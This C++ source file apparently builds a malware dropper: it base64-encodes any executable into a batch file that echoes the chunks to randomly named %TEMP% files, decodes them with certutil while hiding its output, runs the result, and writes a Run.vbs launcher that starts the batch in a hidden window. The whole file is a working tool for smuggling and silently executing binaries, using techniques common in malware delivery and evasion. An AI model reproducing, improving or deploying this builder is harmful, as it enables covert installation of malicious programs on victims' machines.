#include <fstream>
#include <iostream>
#include <vector>
#include <string>

#include "inc/base64.cpp" 

std::string getRandomFileName() {
    const std::string alphabet = "abcdefghijklmnopqrstuvwxyz0123456789";
    const int length = 10; // Adjust the length of the random string as needed

    std::string randomName;
    srand(time(nullptr));

    for (int i = 0; i < length; ++i) {
        randomName += alphabet[rand() % alphabet.length()];
    }

    return "%TEMP%\\" + randomName;
}

std::vector<std::string> splitBase64String(const std::string& base64, size_t partSize) {
    std::vector<std::string> parts;
    for (size_t i = 0; i < base64.length(); i += partSize) {
        parts.push_back(base64.substr(i, partSize));
    }
    return parts;
}


int main(int argc, char* argv[]) {
    if (argc != 2) {
        std::cerr << "Usage: " << argv[0] << " <input_exe>" << std::endl;
        return 1;
    }

    std::ifstream inputFile(argv[1], std::ios::binary);
    if (!inputFile.is_open()) {
        std::cerr << "Error opening input file." << std::endl;
        return 1;
    }

    std::vector<char> buffer(std::istreambuf_iterator<char>(inputFile), {});
    inputFile.close();

    std::string base64String = toBase64(buffer); // Implement your Base64 encoding
    auto base64Parts = splitBase64String(base64String, 800); // Split into parts

    std::ofstream outputFile("dist/man.bat");
    if (!outputFile.is_open()) {
        std::cerr << "Error opening output file." << std::endl;
        return 1;
    }

    outputFile << "@echo off\n";
    outputFile << "setlocal enableextensions enabledelayedexpansion\n";

    // Define file paths using %TEMP%
    outputFile << "set TEMPBASE64=" << getRandomFileName() << ".txt\n";
    outputFile << "set TEMPEXE=" << getRandomFileName() << ".exe\n";
    
    // outputFile << "set TEMPBASE64=%TEMP%\\tempBase64.txt\n";
    // outputFile << "set TEMPEXE=%TEMP%\\tempExecutable.exe\n";

    // Start writing parts to the temp file directly
    for (size_t i = 0; i < base64Parts.size(); ++i) {
        if (i == 0) {
            outputFile << "echo " << base64Parts[i] << " > %TEMPBASE64%\n";
        } else {
            outputFile << "echo " << base64Parts[i] << " >> %TEMPBASE64%\n";
        }
    }

    // Decode the Base64 file to binary using CertUtil
    outputFile << "certutil -decode %TEMPBASE64% %TEMPEXE% >NUL 2>NUL\n";

    // Execute the binary
    outputFile << "start /wait %TEMPEXE%\n";

    // Optional: Clean up temp files
    // outputFile << "del %TEMPBASE64% %TEMPEXE%\n"; // not working as of now
    outputFile << "del %TEMPBASE64%\n";
    // outputFile << "del %TEMPEXE%\n"; // not working as of now (access denied)

    outputFile.close();

    std::ofstream runVbsFile("dist/Run.vbs");

    if (runVbsFile.is_open()) {
        // Write VBScript content to Run.vbs file
        runVbsFile << "Set objShell = WScript.CreateObject(\"WScript.Shell\")\n";
        runVbsFile << "objShell.Run \"cmd.exe /c man.bat\", 0, False\n";
        runVbsFile << "Set objShell = Nothing\n";

        runVbsFile.close();
        std::cout << "VBScript file generated successfully." << std::endl;
    } else {
        std::cerr << "Unable to create VBScript file." << std::endl;
        return 1;
    }

    

    std::cout << "Conversion completed. Check the output bat file." << std::endl;
    return 0;
}